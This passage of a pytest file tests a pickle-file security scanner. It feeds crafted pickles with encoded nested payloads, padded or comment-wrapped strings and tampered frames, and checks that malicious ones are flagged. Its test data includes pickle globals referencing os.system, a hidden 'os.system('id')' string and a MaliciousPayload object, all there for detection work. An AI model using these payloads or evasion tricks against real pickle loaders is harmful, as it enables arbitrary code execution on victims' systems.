        pickle.dumps({"metadata": encoded}, protocol=4),
        source="lenient-compact-base64.pkl",
    )

    assert report.verdict in {SafetyVerdict.SUSPICIOUS, SafetyVerdict.MALICIOUS}
    assert any(finding.rule_code == expected_rule for finding in report.findings)


@pytest.mark.parametrize(
    "encoded",
    [
        "AAA=ly4=",
        "AA==ly4=",
        "A" * 63 + "=ly4=",
        "A" * 63 + "==ly4=",
        "A" * 66 + "==ly4=",
    ],
)
def test_scan_bytes_ignores_compact_base64_tail_after_terminal_padding(encoded: str) -> None:
    assert encoded.endswith("ly4=")
    assert base64.b64decode(encoded[-4:]) == b"\x97."

    report = scan_bytes(
        pickle.dumps({"metadata": encoded}, protocol=4),
        source="terminal-padding-base64-tail.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert all(
        notice.code not in {"encoded_nested_payload_detected", "nested_pickle_incomplete"} for notice in report.notices
    )


def test_scan_bytes_preserves_four_byte_data_only_base64_boundary() -> None:
    nested_payload = b"\x80\x04N."
    encoded = base64.b64encode(nested_payload).decode("ascii")
    report = scan_bytes(
        pickle.dumps({"metadata": encoded}, protocol=4),
        source="four-byte-base64-boundary.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        notice.code == "encoded_nested_payload_detected"
        and notice.details.get("payload_size") == len(nested_payload)
        and notice.details.get("nested_has_execution_opcode") is False
        for notice in report.notices
    )


@pytest.mark.parametrize(
    "nested_payload",
    [
        b"\x80\x04",
        b"\x97",
        b"\x97.",
        b"\x97\x98.",
    ],
)
def test_scan_bytes_fails_closed_for_compact_base64_prefixes(
    nested_payload: bytes,
) -> None:
    encoded = base64.b64encode(nested_payload).decode("ascii")
    report = scan_bytes(
        pickle.dumps({"metadata": encoded}, protocol=4),
        source="compact-base64-incomplete.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S601" and finding.details.get("analysis_incomplete") is True
        for finding in report.findings
    )
    assert any(
        notice.code == "nested_pickle_incomplete"
        and notice.details.get("nested_encoding") == "base64"
        and notice.details.get("analysis_incomplete") is True
        for notice in report.notices
    )


@pytest.mark.parametrize("nested_payload", [b"cos\nsystem\n", b"Xcos\nsystem\n"])
def test_scan_bytes_fails_closed_for_encoded_dangerous_global_prefix(
    nested_payload: bytes,
) -> None:
    encoded = base64.b64encode(nested_payload).decode("ascii")
    report = scan_bytes(
        pickle.dumps({"metadata": encoded}, protocol=4),
        source="dangerous-global-base64-incomplete.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "S601" and finding.details.get("analysis_incomplete") is True
        for finding in report.findings
    )


@pytest.mark.parametrize(
    "encoded",
    ["gAQ==", "=gAQ=", "!gAQ!=", "lw==============", "lw=!=", "lw= ="],
)
def test_scan_bytes_fails_closed_for_lenient_compact_base64_prefix(encoded: str) -> None:
    report = scan_bytes(
        pickle.dumps({"metadata": encoded}, protocol=4),
        source="lenient-compact-base64-incomplete.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S601" and finding.details.get("analysis_incomplete") is True
        for finding in report.findings
    )
    assert any(
        notice.code == "nested_pickle_incomplete"
        and notice.details.get("nested_encoding") == "base64"
        and notice.details.get("analysis_incomplete") is True
        for notice in report.notices
    )


def test_scan_bytes_records_data_only_base64_nested_pickle_payloads_as_notices() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    report = scan_bytes(
        pickle.dumps({"outer": base64.b64encode(nested_payload).decode("ascii")}, protocol=4),
        source="nested-base64.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        notice.code == "encoded_nested_payload_detected"
        and notice.details.get("encoding") == "base64"
        and notice.details.get("nested_has_execution_opcode") is False
        for notice in report.notices
    )


def test_scan_bytes_detects_comment_wrapped_base64_nested_pickle_payloads() -> None:
    nested_payload = pickle.dumps(MaliciousPayload(), protocol=4)
    encoded = base64.b64encode(nested_payload).decode("ascii")
    wrapped = f"# this is doc\n# {encoded[:12]}\n# {encoded[12:]}\n# more"

    report = scan_bytes(
        pickle.dumps({"outer": wrapped}, protocol=4),
        source="wrapped-base64-nested.pkl",
    )

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "S601" for finding in report.findings)
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.details.get("nested_encoding") == "base64"
        and finding.details.get("nested_details", {}).get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_scan_bytes_records_data_only_base64_nested_pickle_hidden_inside_large_literal_as_notice() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    hidden_payload = "A" * 64 + base64.b64encode(nested_payload).decode("ascii") + "A" * 64

    report = scan_bytes(
        pickle.dumps({"outer": hidden_payload}, protocol=4),
        source="hidden-base64-nested.pkl",
        options=ScanOptions(max_string_literal_scan_chars=8),
    )

    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert any(notice.code == "encoded_nested_payload_detected" for notice in report.notices)
    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)


def test_scan_bytes_marks_late_base64_nested_pickle_inside_budget_as_incomplete() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    hidden_payload = "A" * (1024 * 1024 + 64) + base64.b64encode(nested_payload).decode("ascii") + "A" * 64

    report = scan_bytes(
        pickle.dumps({"outer": hidden_payload}, protocol=4),
        source="late-hidden-base64-nested.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert any(
        notice.code == "literal_scan_truncated"
        and notice.message == "String literal scan truncated at configured limit"
        for notice in report.notices
    )


def test_scan_bytes_keeps_normalized_whole_base64_nested_literal_complete() -> None:
    nested_payload = pickle.dumps({"inner": b"A" * 800_000}, protocol=4)
    encoded_payload = base64.b64encode(nested_payload).decode("ascii") + "\n"

    report = scan_bytes(
        pickle.dumps({"outer": encoded_payload}, protocol=4),
        source="whole-base64-nested-with-trailing-whitespace.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert any(notice.code == "encoded_nested_payload_detected" for notice in report.notices)
    assert not any(notice.code == "literal_scan_truncated" for notice in report.notices)


def test_scan_bytes_ignores_invalid_base64_nested_pickle_near_match_hidden_inside_large_literal() -> None:
    nested_payload = _corrupt_first_byte(pickle.dumps({"inner": "data"}, protocol=4))
    hidden_payload = "A" * 64 + base64.b64encode(nested_payload).decode("ascii") + "A" * 64

    report = scan_bytes(
        pickle.dumps({"outer": hidden_payload}, protocol=4),
        source="hidden-base64-nested-near-match.pkl",
        options=ScanOptions(max_string_literal_scan_chars=8),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)


def test_scan_bytes_records_data_only_hex_nested_pickle_payloads_as_notices() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    report = scan_bytes(
        pickle.dumps({"outer": binascii.hexlify(nested_payload).decode("ascii")}, protocol=4),
        source="nested-hex.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        notice.code == "encoded_nested_payload_detected"
        and notice.details.get("encoding") == "hex"
        and notice.details.get("nested_has_execution_opcode") is False
        for notice in report.notices
    )


def test_scan_bytes_records_data_only_hex_nested_pickle_hidden_inside_large_literal_as_notice() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    hidden_payload = "A" * 64 + binascii.hexlify(nested_payload).decode("ascii") + "A" * 64

    report = scan_bytes(
        pickle.dumps({"outer": hidden_payload}, protocol=4),
        source="hidden-hex-nested.pkl",
        options=ScanOptions(max_string_literal_scan_chars=8),
    )

    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert any(notice.code == "encoded_nested_payload_detected" for notice in report.notices)
    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)


def test_scan_bytes_ignores_invalid_hex_nested_pickle_near_match_hidden_inside_large_literal() -> None:
    nested_payload = _corrupt_first_byte(pickle.dumps({"inner": "data"}, protocol=4))
    hidden_payload = "A" * 64 + binascii.hexlify(nested_payload).decode("ascii") + "A" * 64

    report = scan_bytes(
        pickle.dumps({"outer": hidden_payload}, protocol=4),
        source="hidden-hex-nested-near-match.pkl",
        options=ScanOptions(max_string_literal_scan_chars=8),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)


def test_scan_bytes_records_data_only_escaped_hex_nested_pickle_payloads_as_notices() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    escaped_hex_payload = "".join(f"\\x{byte:02x}" for byte in nested_payload)

    report = scan_bytes(
        pickle.dumps({"outer": escaped_hex_payload}, protocol=4),
        source="nested-escaped-hex.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        notice.code == "encoded_nested_payload_detected"
        and notice.details.get("encoding") == "escaped_hex"
        and notice.details.get("nested_has_execution_opcode") is False
        for notice in report.notices
    )


def test_scan_bytes_applies_nested_byte_budget_after_unescaping_hex_literals() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    escaped_hex_payload = "".join(f"\\x{byte:02x}" for byte in nested_payload)

    report = scan_bytes(
        pickle.dumps({"outer": escaped_hex_payload}, protocol=4),
        source="nested-escaped-hex-budget.pkl",
        options=ScanOptions(max_nested_pickle_bytes=len(nested_payload)),
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        notice.code == "encoded_nested_payload_detected"
        and notice.details.get("encoding") == "escaped_hex"
        and notice.details.get("analysis_incomplete") is not True
        for notice in report.notices
    )


def test_scan_bytes_records_truncated_literal_scan_notice() -> None:
    report = scan_bytes(
        pickle.dumps({"code": "A" * 128}, protocol=4),
        source="large-string.pkl",
        options=ScanOptions(max_string_literal_scan_chars=8),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.is_clean is False
    assert report.coverage.opcode_scan_complete is False
    assert any(
        notice.code == "literal_scan_truncated"
        and notice.details.get("literal_length") == 128
        and notice.details.get("analysis_incomplete") is True
        for notice in report.notices
    )


def test_scan_bytes_flags_suspicious_literal_content_across_truncated_literal_windows() -> None:
    hidden_payload = "A" * 32 + "os.system('id')" + "B" * 32

    report = scan_bytes(
        pickle.dumps({"code": hidden_payload}, protocol=4),
        source="hidden-large-string.pkl",
        options=ScanOptions(max_string_literal_scan_chars=8),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert report.is_clean is False
    assert any(
        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
        for finding in report.findings
    )
    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)


def test_scan_bytes_flags_suspicious_literal_content_across_default_long_literal_windows() -> None:
    gap_padding = "A" * (4 * 1024 * 1024 + 2048)
    hidden_payload = gap_padding + "os.system('id')" + gap_padding

    report = scan_bytes(
        pickle.dumps({"code": hidden_payload}, protocol=4),
        source="default-hidden-large-string.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
        for finding in report.findings
    )
    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)


def test_scan_bytes_flags_suspicious_literal_content_beyond_default_prefix_suffix_windows() -> None:
    gap_padding = "A" * (8 * 1024 * 1024 + 4096)
    hidden_payload = gap_padding + "os.system('id')" + gap_padding

    report = scan_bytes(
        pickle.dumps({"code": hidden_payload}, protocol=4),
        source="middle-hidden-large-string.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
        for finding in report.findings
    )
    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)


def test_scan_bytes_still_checks_bounded_encoded_nested_windows_for_truncated_literals() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    padded_encoded_payload = base64.b64encode(nested_payload).decode("ascii") + ("A" * 128)

    report = scan_bytes(
        pickle.dumps({"outer": padded_encoded_payload}, protocol=4),
        source="padded-encoded-nested.pkl",
        options=ScanOptions(max_string_literal_scan_chars=8),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert any(notice.code == "encoded_nested_payload_detected" for notice in report.notices)
    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)


@pytest.mark.parametrize(
    ("literal", "encoding", "rule_code", "embedded"),
    [
        (base64.b64encode(pickle.dumps({"inner": "data"}, protocol=4)).decode("ascii"), "base64", "S601", False),
        (base64.b64encode(pickle.dumps({"inner": "data"}, protocol=4)).decode("ascii"), "base64", "S601", True),
        (binascii.hexlify(pickle.dumps({"inner": "data"}, protocol=4)).decode("ascii"), "hex", "S602", False),
        (binascii.hexlify(pickle.dumps({"inner": "data"}, protocol=4)).decode("ascii"), "hex", "S602", True),
    ],
)
def test_scan_bytes_fails_closed_for_encoded_nested_payload_over_byte_limit(
    literal: str,
    encoding: str,
    rule_code: str,
    embedded: bool,
) -> None:
    value = f"prefix-{literal}-suffix" if embedded else literal
    report = scan_bytes(
        pickle.dumps({"outer": value}, protocol=4),
        source=f"oversized-{encoding}-nested-embedded-{embedded}.pkl",
        options=ScanOptions(max_nested_pickle_bytes=4),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == rule_code
        and finding.details.get("encoding") == encoding
        and finding.details.get("analysis_incomplete") is True
        and finding.details.get("max_nested_pickle_bytes") == 4
        for finding in report.findings
    )
    assert any(
        notice.code == "encoded_nested_payload_truncated"
        and notice.details.get("encoding") == encoding
        and notice.details.get("analysis_incomplete") is True
        for notice in report.notices
    )


def test_scan_bytes_collapses_protocol5_buffer_opcode_notices() -> None:
    report = scan_bytes(b"\x80\x05\x97\x97\x98\x97\x98.", source="many-buffer-opcodes.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert not report.is_clean
    buffer_notices = [notice for notice in report.notices if notice.code == "buffer_opcode"]
    assert len(buffer_notices) == 1
    assert buffer_notices[0].details["buffer_opcode_count"] == 5
    assert buffer_notices[0].details["next_buffer_count"] == 3
    assert buffer_notices[0].details["readonly_buffer_count"] == 2
    assert buffer_notices[0].details["readonly_buffer_empty_stack_count"] == 0
    assert buffer_notices[0].details["requires_external_buffer_context"] is True
    assert buffer_notices[0].details["analysis_incomplete"] is True


def test_scan_bytes_preserves_readonly_buffer_empty_stack_parity() -> None:
    report = scan_bytes(b"\x80\x05\x98\x93.", source="readonly-empty-stack.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    finding = next(finding for finding in report.findings if finding.rule_code == "MALFORMED_STACK_GLOBAL")
    assert finding.details["module_operand"] == "NoneType:None"
    assert finding.details["name_operand"] == "NoneType:None"
    buffer_notice = next(notice for notice in report.notices if notice.code == "buffer_opcode")
    assert buffer_notice.details["readonly_buffer_empty_stack_count"] == 1
    assert buffer_notice.details["analysis_incomplete"] is True


def test_scan_bytes_fails_closed_for_readonly_buffer_empty_stack() -> None:
    report = scan_bytes(b"\x80\x05\x98.", source="readonly-empty-stack.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert not report.is_clean
    buffer_notice = next(notice for notice in report.notices if notice.code == "buffer_opcode")
    assert buffer_notice.details["next_buffer_count"] == 0
    assert buffer_notice.details["readonly_buffer_empty_stack_count"] == 1
    assert buffer_notice.details["readonly_buffer_invalid_stack_count"] == 1
    assert buffer_notice.details["requires_external_buffer_context"] is False
    assert buffer_notice.details["analysis_incomplete"] is True


@pytest.mark.parametrize(
    "payload",
    [
        b"\x80\x05N\x98.",
        b"\x80\x05G\x00\x00\x00\x00\x00\x00\x00\x00\x98.",
    ],
    ids=["primitive-none", "opaque-float"],
)
def test_scan_bytes_fails_closed_for_non_buffer_readonly_operand(payload: bytes) -> None:
    report = scan_bytes(payload, source="non-buffer-readonly.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert not report.is_clean
    buffer_notice = next(notice for notice in report.notices if notice.code == "buffer_opcode")
    assert buffer_notice.details["next_buffer_count"] == 0
    assert buffer_notice.details["readonly_buffer_empty_stack_count"] == 0
    assert buffer_notice.details["readonly_buffer_invalid_stack_count"] == 1
    assert buffer_notice.details["requires_external_buffer_context"] is False
    assert buffer_notice.details["analysis_incomplete"] is True


def test_scan_bytes_preserves_complete_coverage_for_in_band_readonly_buffer() -> None:
    report = scan_bytes(
        b"\x80\x05\x96\x01\x00\x00\x00\x00\x00\x00\x00A\x98.",
        source="in-band-readonly-buffer.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.is_clean
    buffer_notice = next(notice for notice in report.notices if notice.code == "buffer_opcode")
    assert buffer_notice.details["next_buffer_count"] == 0
    assert buffer_notice.details["readonly_buffer_count"] == 1
    assert buffer_notice.details["readonly_buffer_invalid_stack_count"] == 0
    assert buffer_notice.details["requires_external_buffer_context"] is False
    assert buffer_notice.details["analysis_incomplete"] is False


def test_scan_bytes_records_oversized_frame_notice() -> None:
    report = scan_bytes(b"\x80\x04\x95\xfe\xff\xff\xff\xff\xff\xff\xff}.", source="oversized-frame.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(finding for finding in report.findings if finding.rule_code == "STRUCTURAL_TAMPER")
    assert finding.details["tamper_type"] == "oversized_frame"
    assert finding.details["frame_length"] == 0xFFFFFFFFFFFFFFFE
    assert finding.details["remaining_bytes"] == 2
    notice = next(notice for notice in report.notices if notice.code == "oversized_frame")
    assert notice.details["frame_length"] == 0xFFFFFFFFFFFFFFFE
    assert notice.details["remaining_bytes"] == 2


def test_scan_bytes_records_slightly_oversized_frame_notice() -> None:
    report = scan_bytes(b"\x80\x04\x95\x03\x00\x00\x00\x00\x00\x00\x00}.", source="slightly-oversized-frame.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(finding for finding in report.findings if finding.rule_code == "STRUCTURAL_TAMPER")
    assert finding.details["tamper_type"] == "oversized_frame"
    assert finding.details["frame_length"] == 3
    assert finding.details["remaining_bytes"] == 2
    notice = next(notice for notice in report.notices if notice.code == "oversized_frame")
    assert notice.details["frame_length"] == 3
    assert notice.details["remaining_bytes"] == 2


def test_scan_bytes_accepts_exact_frame_length() -> None:
    payload = b"\x80\x04\x95\x02\x00\x00\x00\x00\x00\x00\x00}."

    report = scan_bytes(payload, source="exact-frame.pkl")

    assert pickle.loads(payload) == {}
    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert not any(finding.details.get("tamper_type") == "oversized_frame" for finding in report.findings)
    assert not any(notice.code == "oversized_frame" for notice in report.notices)


def test_scan_bytes_flags_frame_crossing_stop_before_follow_on_stream() -> None:
    payload = b"\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00}.\x80\x04N."

    report = scan_bytes(payload, source="frame-crossing-stop.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(
        finding
        for finding in report.findings
        if finding.rule_code == "STRUCTURAL_TAMPER" and finding.details.get("overrun_boundary") == "stop"
    )
    assert finding.details["tamper_type"] == "oversized_frame"
    assert finding.details["frame_length"] == 5
    assert finding.details["remaining_bytes"] == 2


def test_scan_bytes_accepts_frame_ending_before_stop() -> None:
    payload = b"\x80\x04\x95\x01\x00\x00\x00\x00\x00\x00\x00}."

    assert pickle.loads(payload) == {}
    report = scan_bytes(payload, source="frame-ending-before-stop.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert not any(finding.details.get("tamper_type") == "oversized_frame" for finding in report.findings)
    assert not any(notice.code == "oversized_frame" for notice in report.notices)


def test_scan_bytes_flags_frame_crossing_next_frame() -> None:
    payload = b"\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00}\x95\x01\x00\x00\x00\x00\x00\x00\x00."

    report = scan_bytes(payload, source="frame-crossing-next-frame.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(
        finding
        for finding in report.findings
        if finding.rule_code == "STRUCTURAL_TAMPER" and finding.details.get("overrun_boundary") == "next_frame"
    )
    assert finding.details["tamper_type"] == "oversized_frame"
    assert finding.details["frame_length"] == 5
    assert finding.details["remaining_bytes"] == 1


def test_scan_bytes_accepts_exact_adjacent_frames() -> None:
    payload = b"\x80\x04\x95\x01\x00\x00\x00\x00\x00\x00\x00}\x95\x01\x00\x00\x00\x00\x00\x00\x00."

    assert pickle.loads(payload) == {}
    report = scan_bytes(payload, source="exact-adjacent-frames.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert not any(finding.details.get("tamper_type") == "oversized_frame" for finding in report.findings)
    assert not any(notice.code == "oversized_frame" for notice in report.notices)


def test_scan_bytes_fails_closed_when_import_references_are_truncated() -> None:
    payload = (b"cmath\nsin\n0" * 10_000) + b"cmath\ncos\n0."

    report = scan_bytes(payload, source="import-reference-cap.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.metadata["analysis_incomplete"] is True
    assert report.metadata["import_references_truncated"] is True
    assert len(report.metadata["import_references"]) == 10_000
    assert not any(reference["name"] == "cos" for reference in report.metadata["import_references"])
    notice = next(notice for notice in report.notices if notice.code == "import_references_truncated")
    assert notice.details["analysis_incomplete"] is True
    assert notice.details["max_import_references"] == 10_000


def test_scan_bytes_keeps_duplicate_import_reference_overflow_conclusive() -> None:
    payload = (b"cmath\nsin\n0" * 10_001) + b"."

    report = scan_bytes(payload, source="duplicate-import-reference-cap.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.metadata["import_references_truncated"] is False
    assert "analysis_incomplete" not in report.metadata
    assert len(report.metadata["import_references"]) == 10_000
    assert all(notice.code != "import_references_truncated" for notice in report.notices)


def test_scan_stream_preserves_absolute_offsets_from_current_stream_position() -> None:
    prefix = b"HEADER"
    payload = pickle.dumps(MaliciousPayload())
    stream = io.BytesIO(prefix + payload)
    stream.seek(len(prefix))

    report = PickleScanner().scan_stream(stream, source="embedded.npy", size=len(payload))

    assert report.metadata["first_pickle_end_pos"] == len(prefix) + len(payload)
    finding_positions = [
        int(match.group(1))
        for finding in report.findings
        if finding.location is not None and "embedded.npy" in finding.location
        for match in [re.search(r"\(pos (\d+)\)$", finding.location)]
        if match is not None
    ]
    assert finding_positions
    assert all(position >= len(prefix) for position in finding_positions)
